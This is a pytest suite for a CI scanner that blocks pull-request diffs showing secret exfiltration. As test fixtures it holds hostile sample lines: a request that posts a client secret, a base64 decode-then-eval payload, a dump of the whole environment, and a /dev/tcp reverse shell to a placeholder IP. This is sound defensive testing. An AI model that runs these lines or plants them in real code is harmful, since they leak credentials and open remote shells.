from __future__ import annotations

import os
import subprocess
import sys
from pathlib import Path

REPO_ROOT = Path(__file__).resolve().parents[3]
SCRIPT = REPO_ROOT / ".github/scripts/security-scan/exfil-scan.py"


def _run(tmp_path: Path, diff: str) -> subprocess.CompletedProcess[str]:
    """
    Run exfil-scan.py over a unified-diff string and return the finished process.

    :param tmp_path: Pytest tmp dir for the diff file.
    :param diff: Unified-diff text (as ``gh pr diff`` would emit).
    :returns: The completed process; ``returncode`` is non-zero iff blocking,
        and ``stdout`` carries the ``::error``/``::warning`` annotations.
    """
    diff_file = tmp_path / "pr.diff"
    diff_file.write_text(diff)
    env = os.environ.copy()
    env["DIFF_FILE"] = str(diff_file)
    return subprocess.run(
        [sys.executable, str(SCRIPT)],
        env=env,
        capture_output=True,
        text=True,
        timeout=30,
    )


def _diff(path: str, added: list[str]) -> str:
    """
    Build a minimal unified diff that ADDS *added* lines to *path*.

    :param path: Destination file path, e.g. ``"tests/e2e/conftest.py"``.
    :param added: Line bodies to mark as added (no leading ``+``).
    :returns: A unified-diff string the scanner can parse.
    """
    body = "".join(f"+{ln}\n" for ln in added)
    return (
        f"diff --git a/{path} b/{path}\n"
        f"index 1111111..2222222 100644\n"
        f"--- a/{path}\n"
        f"+++ b/{path}\n"
        f"@@ -1,1 +1,{len(added) + 1} @@\n"
        f" context\n"
        f"{body}"
    )


def test_benign_diff_is_clean(tmp_path: Path) -> None:
    """A normal test addition (no exfil, no CI-bootstrap file) scans clean.

    Guards against the scan blocking ordinary contributions. Asserts exit 0 and
    no error annotation for an unremarkable new test file.
    """
    proc = _run(
        tmp_path, _diff("tests/test_math.py", ["def test_add():", "    assert 1 + 1 == 2"])
    )
    assert proc.returncode == 0, proc.stdout
    assert "::error" not in proc.stdout


def test_secret_source_plus_network_blocks(tmp_path: Path) -> None:
    """Reading a secret-named cred AND a network sink in one file blocks.

    The canonical exfil shape. Asserts exit 1 and an error annotation naming the
    offending file.
    """
    proc = _run(
        tmp_path,
        _diff(
            "tests/e2e/conftest.py",
            [
                "import requests, os",
                "requests.post('http://x', data=os.environ['DATABRICKS_CLIENT_SECRET'])",
            ],
        ),
    )
    assert proc.returncode == 1
    assert "::error file=tests/e2e/conftest.py" in proc.stdout


def test_decode_then_exec_blocks(tmp_path: Path) -> None:
    """A decode-then-exec payload blocks even without a network sink.

    ``eval(base64.b64decode(...))`` is almost never legitimate. Asserts exit 1.
    """
    proc = _run(
        tmp_path,
        _diff("setup.py", ["import base64", "eval(base64.b64decode('cHduZWQ='))"]),
    )
    assert proc.returncode == 1


def test_environ_dump_blocks(tmp_path: Path) -> None:
    """Serializing the whole environment blocks (wholesale-secret exfil).

    ``json.dumps(os.environ)`` is a classic dump-everything sink. Asserts exit 1.
    """
    proc = _run(
        tmp_path,
        _diff(
            "tests/conftest.py",
            ["import json, os", "open('/tmp/x','w').write(json.dumps(os.environ))"],
        ),
    )
    assert proc.returncode == 1


def test_reverse_shell_blocks(tmp_path: Path) -> None:
    """A /dev/tcp reverse-shell shape blocks. Asserts exit 1."""
    proc = _run(
        tmp_path,
        _diff(
            "tests/conftest.py",
            ["import os", "os.system('bash -i >& /dev/tcp/1.2.3.4/9001 0>&1')"],
        ),
    )
    assert proc.returncode == 1


def test_normal_gateway_test_not_blocked(tmp_path: Path) -> None:
    """Using LLM_API_KEY + a network call (a normal e2e test) does NOT block.

    Low-false-positive guard: the LLM key is not a secret-NAMED source, so an
    ordinary gateway test that reads it and makes a request scans clean. Asserts
    exit 0.
    """
    proc = _run(
        tmp_path,
        _diff(
            "tests/e2e/test_gateway.py",
            [
                "import requests, os",
                "key = os.environ['LLM_API_KEY']",
                "requests.get(GATEWAY)  # normal e2e",
            ],
        ),
    )
    assert proc.returncode == 0, proc.stdout


def test_ci_file_touch_is_info_not_blocking(tmp_path: Path) -> None:
    """A benign edit to a CI-executed file is INFO (clean), not blocking.

    Editing conftest.py / .github without an exfil pattern should surface a
    warning for the reviewer but not block. Asserts exit 0 with a warning.
    """
    proc = _run(tmp_path, _diff("tests/conftest.py", ["# add a harmless fixture comment"]))
    assert proc.returncode == 0, proc.stdout
    assert "::warning file=tests/conftest.py" in proc.stdout


def test_passing_environ_around_not_blocked(tmp_path: Path) -> None:
    """Passing os.environ to a helper (no dump) does NOT block.

    Regression: a bare ``os.environ)`` matched benign ``helper(os.environ)`` and
    blocked. Only a wholesale dump (``json.dumps(os.environ)`` etc.) should
    block. Asserts exit 0.
    """
    proc = _run(tmp_path, _diff("tests/conftest.py", ["import os", "configure_app(os.environ)"]))
    assert proc.returncode == 0, proc.stdout


def test_generic_access_token_field_not_blocked(tmp_path: Path) -> None:
    """A generic ``access_token`` field + a network call does NOT block.

    Regression: a case-insensitive ``ACCESS_TOKEN`` term matched ordinary
    OAuth/JSON ``access_token`` identifiers and, combined with any network use,
    blocked. Asserts exit 0.
    """
    proc = _run(
        tmp_path,
        _diff(
            "tests/test_oauth.py",
            ["access_token = resp.json()['access_token']", "requests.get(url, headers=h)"],
        ),
    )
    assert proc.returncode == 0, proc.stdout
